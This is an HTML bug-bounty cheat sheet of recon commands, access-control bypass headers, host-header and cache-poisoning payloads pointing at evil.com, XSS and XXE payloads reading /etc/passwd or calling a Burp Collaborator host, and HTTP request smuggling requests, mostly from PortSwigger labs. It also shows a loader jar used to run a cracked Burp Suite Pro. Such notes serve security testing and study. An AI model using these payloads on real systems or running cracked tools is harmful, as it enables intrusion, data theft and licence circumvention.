<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Hunting Cheat Sheet</title>
    <style>
    

body {
    margin: 0;
    padding: 0;
    display: flex;
    font-family: sans-serif;
    line-height: 1.6;
    background-color: #f8f8f8;
    height: 100vh;
}

#sidebar {
    position: fixed;
    width: 280px;
    height: 100vh;
    background-color: #333;
    color: #fff;
    padding: 20px;
    overflow-y: auto;
    border-right: 1px solid #555;
    box-sizing: border-box;
}

#content {
    margin-left: 280px;
    padding: 20px;
    box-sizing: border-box;
    background-color: #f2f2f2; /* Optional: to visualize the content area */
}
        h1, h2, h3 {
            color: #333;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
        }
        h3 {
            color: #555;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        #sidebar a {
            color: #ddd;
        }
        code {
            background-color: #f0f0f0;
            padding: 2px 4px;
            border-radius: 4px;
            font-family: monospace;
            white-space: pre-wrap;
        }
        pre {
            background-color: #f9f9f9;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
            margin-bottom: 5px;
        }
        #content ol {
            list-style-type: decimal;
            margin-left: 20px;
        }
        #content li {
            margin-bottom: 10px;
        }
        p, ul {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
<div id="sidebar">
    <h2>Table of Contents</h2>
    <ul id="sidebar-list"></ul>
</div>

<div id="content">
        <h1 id="bug-hunting-cheat-sheet">Bug Hunting Cheat Sheet</h1>
        <p><a href="https://dorks.faisalahmed.me">https://dorks.faisalahmed.me</a></p>

        <h2 id="cwe-list">CWE List</h2>
        <ul>
            <li>CWE-20: Improper Input Validation</li>
            <li>CWE-22: Path Traversal</li>
            <li>CWE-77: Command Injection</li>
            <li>CWE-78: OS Command Injection</li>
            <li>CWE-79: Cross-site Scripting (XSS)</li>
            <li>CWE-80: Basic XSS</li>
            <li>CWE-89: SQL Injection</li>
            <li>CWE-90: LDAP Injection</li>
            <li>CWE-94: Code Injection</li>
            <li>CWE-99: HTTP Response Splitting</li>
            <li>CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers</li>
            <li>CWE-120: Buffer Copy without Checking Size of Input</li>
            <li>CWE-126: Buffer Overread</li>
            <li>CWE-131: Incorrect Calculation of Buffer Size</li>
            <li>CWE-134: Uncontrolled Format String</li>
            <li>CWE-190: Integer Overflow or Wraparound</li>
            <li>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</li>
            <li>CWE-209: Information Exposure Through an Error Message</li>
            <li>CWE-213: Intentional Information Exposure</li>
            <li>CWE-215: Information Exposure Through Debug Information</li>
            <li>CWE-235: Improper Handling of Extra Parameters</li>
            <li>CWE-250: Execution with Unnecessary Privileges</li>
            <li>CWE-284: Improper Access Control</li>
            <li>CWE-306: Missing Authentication for Critical Function</li>
            <li>CWE-307: Improper Restriction of Excessive Authentication Attempts</li>
            <li>CWE-311: Missing Encryption of Sensitive Data</li>
            <li>CWE-312: Cleartext Storage of Sensitive Information</li>
            <li>CWE-319: Cleartext Transmission of Sensitive Information</li>
            <li>CWE-352: Cross-Site Request Forgery (CSRF)</li>
            <li>CWE-362: Race Condition</li>
            <li>CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition</li>
            <li>CWE-384: Session Fixation</li>
            <li>CWE-400: Uncontrolled Resource Consumption</li>
            <li>CWE-416: Use After Free</li>
            <li>CWE-426: Untrusted Search Path</li>
            <li>CWE-434: Unrestricted Upload of File with Dangerous Type</li>
            <li>CWE-472: External Control of Assumed-Immutable Web Parameter</li>
            <li>CWE-476: NULL Pointer Dereference</li>
            <li>CWE-494: Download of Code Without Integrity Check</li>
            <li>CWE-502: Deserialization of Untrusted Data</li>
            <li>CWE-521: Weak Password Requirements</li>
            <li>CWE-522: Insufficiently Protected Credentials</li>
            <li>CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</li>
            <li>CWE-611: Improper Restriction of XML External Entity Reference (XXE)</li>
            <li>CWE-614: Sensitive Cookie in HTTPS Session Without ‘Secure’ Attribute</li>
            <li>CWE-732: Incorrect Permission Assignment for Critical Resource</li>
            <li>CWE-759: Use of a One-Way Hash without a Salt</li>
            <li>CWE-798: Use of Hard-coded Credentials</li>
            <li>CWE-807: Reliance on Untrusted Inputs in a Security Decision</li>
            <li>CWE-918: Server-Side Request Forgery (SSRF)</li>
        </ul>

        <h2 id="for-graph-ql">For Graph QL :</h2>
        <p>Bounty targets at one place ::: <a href="https://github.com/arkadiyt/bounty-targets-data">https://github.com/arkadiyt/bounty-targets-data</a></p>
        <p><a href="https://github.com/dn0m1n8tor/learn365">https://github.com/dn0m1n8tor/learn365</a></p>

        <h2 id="java-burp">Java Burp</h2>
        <pre><code>
cd C:\Program Files\Java\jdk-17.0.2\bin
java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:"C:\Users\dev\Desktop\New_loader.jar" -noverify -jar "C:\Users\dev\Desktop\burpsuite_pro_v2022.1.1.jar"
        </code></pre>

        <h2 id="cheat-sheet">My Cheat seat for finding most coomon bug at very first sight:::::</h2>
        <p><a href="https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/">https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/</a></p>
        <p><a href="https://www.youtube.com/watch?v=l0YsEk_59fQ">https://www.youtube.com/watch?v=l0YsEk_59fQ</a> Read this artical</p>
        <p><a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html</a></p>

        <h2 id="shodan">Shodan</h2>
        <p><code>curl https://internetdb.shodan.io/199.212.246.4</code> for IP info on shodan</p>
        <p><code>bbscope godfatherarva chaos</code></p>

        <h2 id="updatedb">updatedb</h2>
        <p><code>updatedb</code> for update the db usefull for locate command</p>

        <h2 id="ubuntu-mail">Ubuntu Mail</h2>
        <p><a href="https://tonyteaches.tech/postfix-gmail-smtp-on-ubuntu/">https://tonyteaches.tech/postfix-gmail-smtp-on-ubuntu/</a></p>

        <h2 id="wordlists">Wordlists</h2>
        <p><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p>

        <h2 id="subdomain">Subdomain</h2>
        <p><a href="https://subdomainfinder.c99.nl/scans/2021-09-09/nab.com.au">https://subdomainfinder.c99.nl/scans/2021-09-09/nab.com.au</a></p>

        <h2 id="bgp-he-net">bgp.he.net</h2>
        <p>000>>  <a href="https://bgp.he.net">https://bgp.he.net</a></p>

        <h2 id="hping3">hping3</h2>
        <p><code>hping3 -S 199.212.246.34 -c 100 -p ++1</code></p>

        <h2 id="amass-enum">amass enum</h2>
        <p><code>amass enum -d domain.com</code> for subdomain enum</p>
        <p><code>amass enum -df file.txt</code> subdomain for file.txt where root domain are</p>

        <h2 id="altdns">altdns</h2>
        <p><code>altdns -i subss -o subsss -w /home/kali/wordlists/words.txt -r -s altdns</code></p>

        <h2 id="dnsvalidator">dnsvalidator</h2>
        <p><code>dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt</code></p>

        <h2 id="uncover">uncover</h2>
        <p><code>uncover -q 'org:"Example  Inc."' | httpx | nuclei</code></p>

        <h2 id="hash-extender">Hash Extender</h2>
        <pre><code>
docker run -Pit alpine
apk add build-base make curl git openssl-dev
git clone https://github.com/iagox86/hash_extender.git
cd hash_extender
make
        </code></pre>

        <h2 id="docker-wordpress">Docker WordPress</h2>
        <p>Docker command for wordpress:
        <code>docker run -it --rm wpscanteam/wpscan --url https://press-smoke.hulu.com/</code></p>

        <h2 id="json-xml">JSON to XML</h2>
        <p>If you want to convert josn in xml for xml injection testin then use following site
            <a href="https://www.freeformatter.com/json-to-xml-converter.html">https://www.freeformatter.com/json-to-xml-converter.html</a>
        </p>

        <h2 id="pastebin">Pastebin</h2>
        <p>Use pastbin for host some data linke html , xxe, cors</p>

        <hr/>

        <h2 id="rate-limiting-bypass">Rate Limiting Bypass</h2>
        <pre><code>
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
        </code></pre>

        <h2 id="401-bypass">401 Bypass</h2>
        <pre><code>
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
        </code></pre>

        <h2 id="path-bypass-headers">Path Bypass Headers</h2>
        <pre><code>
X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console
        </code></pre>

        <hr/>

        <p><a href="https://bugbountyhunter.com/">https://bugbountyhunter.com/</a></p>
        <p><a href="https://danielmiessler.com/projects/webappsec_testing_resources/">https://danielmiessler.com/projects/webappsec_testing_resources/</a> Methodology For bugs</p>

       <h3 id="idor-bypass">IDOR bypass for 401/403</h3>
        <ol>
            <li> Wrap ID with an array {“id”:111} --> {“id”:[111]}</li>
            <li>JSON wrap {“id”:111} --> {“id”:{“id”:111}}</li>
            <li>Send ID twice URL?id=<LEGIT>&id=<VICTIM></li>
            <li>Send wildcard {""user_id"":""*""}</li>
        </ol>

       <h3 id="no-rate-limiting-account-deletion">No Rate Limiting & Delete account without confirmation</h3>

       <h3 id="long-password-dos">Long Password Dos Attack and Account lockout application dos</h3>

        <h3 id="host-header-attack">Host header attack</h3>
        <ul>
            <li>Password reset poisoning from change the host to evil.com</li>
            <li>Password reset poisoning by X-Forwarde-Host to evil.com</li>
            <li>Password reset poisoning through danglink markup and string port in host header 
            </li>
        </ul>

        <h4 id="host-header-auth-bypass">Host header auth bypasss</h4>
        <p>Some times website restrict their functionality to internal user only. . You can bypass this by making simple modification in
            Host header. </p>
        <pre><code>
Host: localhost
Host: 127.0.0.1
        </code></pre>

        <h4 id="routing-based-ssrf">Routing based SSRF</h4>
        <p>Put your burp coalborator domain in host header if request in burp then may be routing based SSRF</p>
        <p>You can brute force public ip( like 192.168.0.X) by intruder in burp pro</p>

        <h4 id="ssrf-flawed-parsing">SSRF ny flawd request parsing</h4>
        <p>If you use host with your burp colob url then site is block your url But if you use absolute url then
            bypass the parsing rule</p>
        <pre><code>
GET https://your-lab-id.web-security-academy.net/
Host: your-collaborator-id.burpcollaborator.net
        </code></pre>

        <h4 id="ssrf-malformed-request-line">SSRF via malformed request line</h4>
        <pre><code>
GET @private-intranet/example HTTP/1.1
        </code></pre>

        <p>If you access the webiste after change the host header then may be host header injection</p>
        <ul>
            <li>If error "Invalid host header" then may be CDN is there</li>
            <li>Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result
                of some kind of security measure. For example, some websites will validate whether the Host header matches the
                SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.</li>
            <li>If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you
                reach the target application, while potentially injecting a payload via the port.</li>
            <li>You can try with subdomain of that site in host header</li>
            <li>Different systems and technologies will handle this case differently, but it is common for one of the two
                headers to be given precedence over the other one, effectively overriding its value. When systems disagree
                about which header is the correct one, this can lead to discrepancies that you may be able to exploit</li>
            <li>The ambiguity caused by supplying both an absolute URL and a Host header can also lead to discrepancies between
                different systems. Officially, the request line should be given precedence when routing the request but, in
                practice, this isn't always the case. You can potentially exploit these discrepancies in much the same way as
                duplicate Host headers.
            </li>
            <li>You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will
                interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's
                value. Other servers will ignore the indented header altogether.</li>

                <pre><code>
GET /example HTTP/1.1
  Host: bad-stuff-here
 Host: vulnerable-website.com
                </code></pre>

            <li>You can sometimes use X-Forwarded-Host to inject your malicious input while circumventing any validation on
                the Host header itself.</li>
            <li>Although X-Forwarded-Host is the de facto standard for this behavior, you may come across other headers that
                serve a similar purpose, including:
            </li>
        </ul>
         <ul>
            <li>X-Forwarded-Host:</li>
            <li>X-Host:</li>
            <li>X-Forwarded-Server:</li>
            <li>X-HTTP-Host-Override:</li>
            <li>Forwarded:</li>
        </ul>
         <ul>
            <li>You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your
                Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or
                another in-path system, this indicates that you may be able to route requests to arbitrary domains.</li>
        </ul>
    <hr/>

        <h3 id="oauth-login-csrf">Oauth Login CSRF</h3>
        <p><a href="https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-and-mitigation-d01dd6d5fa2c">https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-and-mitigation-d01dd6d5fa2c</a></p>

        <h3 id="oauth-connect-csrf">Oauth account connect CSRF</h3>

        <h3 id="oauth-url-redirect">Oauth Url Redirect , try to this with open redirect and LFI</h3>

        <h3 id="oauth-takeover">Oauth Url Redirect account takeover</h3>

        <h3 id="pre-account-takeover">Pre Account Takeover</h3>
        <p> If the application does not require email verification on account creation, try creating an account with a victim’s email address and attacker password before the victim has registered. If the victim then tries to register or sign in with a third party, such as Google, it’s possible the application will do a lookup, see that email is already registered, then link their Google account to the attacker created account. This is a “pre account takeover” where an attacker will have access to the victim’s account if they created it prior to the victim registering.</p>
        <p>If an OAuth app does not require email verification, try signing up with that OAuth app and then change the email address with a victim’s email address. The same issue as above could exist, but you’d be attacking it from the other direction and getting access to the victim’s account for an account takeover.</p>

        <h3 id="obscure-email-vulnerability">Obscure Email vulnerabilty</h3>
        <p>if app register account as ran.veer2354@gmail.com gmail treated is as ranveer2354@gmail.com</p>

        <h3 id="exposed-source-code">Exposed Source Code control</h3>
        <p>if find ---> <code>.git, .gitignore , .bzr , .svn , .hg , CVS</code></p>
        <p>Use gittool in automation for large number of domains</p>

        <h3 id="httpoxy-attack">HTTPoxy attack</h3>
        <p>if you find common cgi files on url or cgi like environment tools in burp</p>

        <h3 id="server-side-includes">Server Side Includes</h3>
        <p>if you find <code>.shtml , .stm , shtm</code></p>

        <h3 id="apache-struts">Apache Struts</h3>
        <p>if you find --> <code>struts error, .action , .do , .java , .out , .bat , .seam , .sh , .bson , .pl , .pm</code></p>

        <h3 id="exif-geolocation">Exif Geolocation</h3>
        <p>not stripped from uploaded image</p>

        <h3 id="apache-byte-range-dos">Apache byte Range Application layer Dos</h3>
        <p>if verion 2.2.x</p>

        <h3 id="webmin-rce">webmin unauthenticated rce</h3>
        <p>in <code>password_change.cgi</code> on 10000 port</p>

        <h3 id="untrusted-js">Untrusted source js exploitation</h3>

        <h3 id="f5-big-ip-rce">F5 Big_IP Rce</h3>
        <p>if find --> <code>/tmui</code></p>

        <h3 id="jira-vulns">Jira vulnerabilities</h3>
        <p>Use Jira-Scan tool for SSRF vulnerabilty</p>
        <p>rce in contact adminitrator.jsp file</p>
        <p>Jira misconfig information discloser find on google</p>
        <p>Pre-Authorization Limited Arbitrary File Read in Jira Server - CVE-2020-29453</p>
        <p>Limited Remote File Read in Jira Software Server - CVE-2021-26086 </p>
        <p><a href="https://twitter.com/harshbothra_/status/1346109605756116995?lang=en">https://twitter.com/harshbothra_/status/1346109605756116995?lang=en</a></p>
        <p><a href="https://github.com/ColdFusionX/CVE-2021-26086">https://github.com/ColdFusionX/CVE-2021-26086</a></p>
        <p><a href="https://github.com/sushantdhopat/JIRA_testing">https://github.com/sushantdhopat/JIRA_testing</a></p>
        <p>For jira all cves here</p>
        <p><a href="https://jira.atlassian.com/browse/JRACLOUD-75473?jql=text%20~%20%22cve%22">https://jira.atlassian.com/browse/JRACLOUD-75473?jql=text%20~%20%22cve%22</a></p>

        <h3 id="hsts-test">HSTS</h3>
        <p>on ssllabs test</p>

        <h3 id="account-lockout">Account Lockout</h3>
        <p>for 24 hour in brute force then vulnerabilty</p>

        <h3 id="blind-xss-test">Test for blind xss</h3>

        <h3 id="identity-testing">Identity Testing</h3>
        <ul>
            <li>You delete your account and your data still on application then vulnerabilty</li>
            <li>Try to signup as admin user</li>
            <li>Try to signup with another user account</li>
        </ul>

       <h3 id="authentication-testing">Authentication Testting</h3>
       <p>Authentication bypass via information disclosure</p>
        <p>If in response see own IP then may be possible this attack</p>
          <p><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass">https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass</a></p>

        <ul>
            <li>Always testing for default creds</li>
            <li>Vulnerable remember me fuctionality</li>
            <li>weak password reset functionality</li>
            <li>weak security question</li>
       </ul>

        <h3 id="application-server-vulns">Application server vulnerabilty</h3>
        <ul>
            <li>Testing default credentials if using open source or coomercial software</li>
            <li>Dangerous PUT http method allowed only if we put a file on server from this method</li>
            <li>Application server trated as proxy and we can try CONNECT method to our server</li>
        </ul>

    <h3 id="web-cache-deception">Web cache deception</h3>

    <h3 id="web-cache-poisoning">Web cache poisoning</h3>
   <h4>Design flaws</h4>
        <ul>
            <li>Using web cache poisoning to deliver an XSS attack
                <pre>X-Forwarded-Host: a."><>aler0t(1)"</></pre>
            </li>
            <li>Using web cache poisoning to exploit unsafe handling of resource imports
              <pre><code> X-Forwarded-Host: evil-user.net</code></pre>
           </li>

            <li>Using web cache poisoning to exploit cookie-handling vulnerabilities.Cookies are often used to dynamically
                generate content in a response</li>
        </ul>
        <p>Place a suitable XSS payload in the fehost cookie, for example:</p>
        <p>fehost=someString"-aler0t(1)-"someString</p>

       <ul>
            <li>Using multiple headers to exploit web cache poisoning vulnerabilities
        <pre><code>
X-Forwarded-Host: evil.com
X-Forwarded-Proto: nohttps
       </code></pre>
           </li>
           <li>Exploiting responses that expose too much information.
               One such example is when responses contain information about how often the cache is purged or how old the
               currently cached response is:
           </li>
      <pre><code>
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
       </code></pre>

           <li>Targeted web cache poisoning using an unknown header</li>
       </ul>

  <p>Find header from param miner extension</p>
     <pre><code>
X-Host: evil.com
    </code></pre>
  <ul>
      <li>Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria</li>
    </ul>

        <ol>
            <li>Use Param Miner to identify that the X-Forwarded-Host header is supported.</li>
            <li>Add the header Access-Control-Allow-Origin: * to your evil site for cors</li>
        </ol>
        <p>payload on evil server</p>
        <pre>
{
"country": "<img src=1 onerror=aler0t(document.cookie) />"
}
       </pre>

      <h4 id="implementation-flaws">Implementation flaws</h4>
      <ul>
           <li>Web cache poisoning via an unkeyed port</li>
       </ul>

   <p>If redirect was dynamically generated based on the Host header . This might enable you to construct a deniel of
            service by simply adding an arbitrary port to the request . All the users who browsed to the home page would
            redirect to a dud port , taking down the home page  until the cache is expired .</p>

          <ul>
              <li>Web cache poisoning via an unkeyed query string</li>
       </ul>

       <p>To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the
            response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore
            an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster
            query parameters redundant.</p>
       <p>Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that
            doesn't interfere with the application's behavior. Some typical examples include:</p>
       <pre><code>
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
      </code></pre>

     <p>Another approach is to see whether there are any discrepancies between how the cache and the back-end
            normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit
           this to issue requests with different keys that still hit the same endpoint. For example, the following
           entries might all be cached separately but treated as equivalent to GET / on the back-end:</p>
        <pre><code>
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
         </code></pre>
       <p>We can use following apyload</p>
       <pre><code>
GET /?evil='/><script>ale0rt(1)</script>
       </code></pre>

         <ul>
            <li>Web cache poisoning via an unkeyed query parameter</li>
        </ul>
  <p>If we use any query parameter we notice that you get cache miss every time change in the query string
        This indicate the this is the part of cache key .Also notice that the query string is reflected in the responce</p>
    <p>Go to param miner to find unkeyed parameter like utm_content</p>
     <p><code>GET /?utm_content='/><script>aler0t(1)</script></code></p>
     <p>Once your payload is cached , remove the utm_content parameter , right-click on the request , and send request
          again to see your apyload is cached on home page</p>
       <ul>
           <li>Web cache poisoning by parameter cloaking</li>
        </ul>
       <p>If site cache excludes a certain parameter from the cache key. There is also inconsistent parameter parsing
            between the cache and the cache and the backend server .</p>
        <p>We can find it by Param miner>>Guess params>>Guess everything</p>
    <p>If site is using JSONP for the cross domain request ,this will contain a callback parameter</p>
  <p>Final payload is <code>GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=aler0t(1)</code></p>

  <ul>
        <li>Exploiting a fat GET support</li>
  </ul>
       <p>If site accepts GET request that have body. but does not include the body in the cache key</p>
  <pre><code>
GET /js/geolocate.js?callback=setCountryCookie
…
callback=aler0t(1)
     </code></pre>
  <ul>
        <li>URL normalization</li>
    </ul>

  <p>Browse to any non-existent path, such as <code>GET /random</code>. Notice that the path you requested is reflected
       in the error message</p>
    <p><code>GET /random</p><script>ale0rt(1)</script><p>foo</code></p>

   <ul>
       <li>Cache key injection</li>
     </ul>
       <ul>
          <li>Internal cache poisoning</li>
    </ul>

    <p>If the response reflects a mixture of both input from the last request you sent and input from previous request
           ,this is a key indicator .
      </p>
        <p>If input is reflected in resposes in multiple distinct page ,in particuler on pages in which you never tried inject
        your input .</p>


      <h3 id="ticket-trick">Ticket Trick bug hunting</h3>
     <p>Company uses Slack ,Yammer, fb for internal communication then</p>
        <ul>
        <li>If there is tikcer issue ticket id creation for thread</li>
                <li>Through form or contact if application create your email for communication like <code>support+ticketid@any.com</code></li>
                <li>If application uses slack then goto slack and register you as <code>support+ticket@any.com</code></li>
                <li>If succefull signup then you can listen internal chats</li>
        </ul>

        <h3 id="evil-account-takeover">Evil way to account takeover</h3>
        <ul>
             <li>Create Two same look like email</li>
                <li>Compsoe email from one mail you will get ticket id for change your email</li>
                <li>Then go to chat system and contact if email change then vulnerability</li>
       </ul>

        <h3 id="shellshock-bash-rce">Shellshock bash rce</h3>
        <p>for --> <code>file.cgi, cgi-bin</code></p>

       <h3 id="nginx-range-filter">Nginx Range filter overflow</h3>

       <h3 id="adobe-coldfusion">Adobe coldfusion vulnerabilty</h3>
      <p><code>.cfml , CFIDE</code></p>

       <h3 id="docker-api-rce">Docker api Unauthenticated rce</h3>
       <p>at port 2275, 2276</p>

       <h3 id="xxe-xml-tag-injection">Xml external entity and xml tag injection</h3>
       <h4 id="xinclude-attacks">XInclude attacks</h4>

        <p>Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse
            the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which
            is then processed by the backend SOAP service.</p>
        <p>In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document
            and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude
            is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an
            XInclude attack within any data value in an XML document, so the attack can be performed in situations where you
            only control a single item of data that is placed into a server-side XML document.</p>

      <p>To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that
            you wish to include. For example:</p>
       <pre><code>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
       </code></pre>

        <p>You can use below payload , when entit is not accepted</p>
           <pre><code>
<ybp xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://a1cqa1g0av62cr8djc1k4s96dxjq7j97av2iz6o.burpcollaborator.net/foo"/></ybp>
           </code></pre>

            <p>XXE with file upload</p>
       <p>Create a local SVG image with the following content:</p>
       <pre><code>
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
</code></pre>

    <h3 id="sql-injection">Sql injection</h3>

     <h3 id="double-order-sql">Double order sql injection</h3>

    <h3 id="postgresql-rce">Postgresql rce</h3>
        <p>On port 5432 need tool pgadmin try with default creds</p>

   <h3 id="phpmyadmin-rce">PHPmyadmin authenticated rce</h3>
    <p>on php<5.4</p>

    <h3 id="mysql-auth-bypass">MySql authentication bypass</h3>

    <h3 id="dns-zone-transfer">DnsZone transfer vulnerabilty</h3>
   <pre><code>
dig @8.8.8.8 victim.com
dig @ns1.server axfr victim.com
   </code></pre>

    <h3 id="http-request-smuggling">HTTP request smugling</h3>
        <p><a href="https://www.youtube.com/watch?v=XC48irGjKNc">https://www.youtube.com/watch?v=XC48irGjKNc</a></p>
        <p><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></p>

        <p>HTTP Request Smuggling (HRS) is a web application vulnerability that enables an attacker to craft a single request
            that hides a second request within the body of the first request.</p>
        <p>CL= Content-Length</p>
        <p>TE= Transfer-Encoding</p>

       <p>if an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the
            following will often cause a time delay:</p>
    <pre><code>
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
    </code></pre>
     <p>If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following
            will often cause a time delay:</p>
          <pre><code>
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
   </code></pre>
      <p>Confirming CL.TE vulerabilities using differential responses
            To confirm a CL.TE vulnerability, you would send an attack request like this:</p>
        <pre><code>
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
        </code></pre>

  <p>To confirm a TE.CL vulnerability by differential response, you would send an attack request like this:</p>
   <pre><code>
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
   </code></pre>

        <p>TE.TE Behavior: ofuscating the TE header</p>

       <p>Here both the servers support TE header but , one of the server can be induced not to process it by obfuscating
            the header in some way.</p>
      <p>Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated
                Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL
                vulnerabilities already described.</p>
        <p>Some ways of obfuscate Transfer-Encoding:</p>

     <pre><code>
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
       </code></pre>
       <p>Note:: After time delay technique if site is vulernable then you can use </p>
         <pre><code>
Host: vulerabl-site
X-Forwarded-For: burp-colab.net
    </code></pre>
     <p>If you get dns lookup in burp then site is vulerable</p>
     <p>If found TE.CL then for exploit you should use size of cunke before the second request</p>
        <h3 id="exploiting-hrs">Exploiting HTTP request smugling</h3>

        <h4 id="exploiting-hrs-bypass-frontend">Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</h4>
       <p>There's an admin panel at /admin, but the front-end server blocks access to it.  we can access it by HTTP smugle</p>
            <p>Issue the following request twice:</p>
 <pre><code>
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
</code></pre>
    <h4 id="exploiting-hrs-reveal-rewriting">Exploiting HTTP request smuggling to reveal front-end request rewriting</h4>

            <p>perform the following steps:</p>
        <ol>
           <li>Find the POST request that reflects the value of a request parameter into application's response</li>
           <li>Shuffle the parameterso that the reflected parameter appears in the message body</li>
             <li>Smuggle this reques to the back-end server</li>
      </ol>
            <pre><code>
POST / HTTP/1.1
Host: acf61f3a1e270e0ec08a1f0200900069.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
       </code></pre>
    <h4 id="exploiting-hrs-webcache-poisoning">Exploiting HTTP request smuggling to perform web cache poisoning</h4>
     <p>If any part of the front-end infrastructure performs caching of content, then it might be possible to poison
                the cache with the off-site redirect response. This will make the attack persistent, affecting any user who
                subsequently requests the affected URL.</p>

     <pre><code>
POST / HTTP/1.1
Host: ac501fa01f560f6ac0eaf2a400a700b1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 198
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-acee1f881f3e0f52c02cf23201410086.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
     </code></pre>

  <h3 id="insecure-cors">Insecure CORS</h3>

 <h3 id="url-redirection">URL Redirection</h3>

        <h3 id="parameter-tampering">Parameter Tampering</h3>

  <h3 id="csrf-vulnerability">CSRF vulnerability</h3>
  <p>Check for IDOR vulnerability</p>

  <h3 id="ssrf-vulnerability">SSRF vulnerability</h3>
      <p>if found parameter like ; <code>uri=, url= , file= ,</code></p>
         <ul>
           <li>SSRF to RFI to Shell</li>
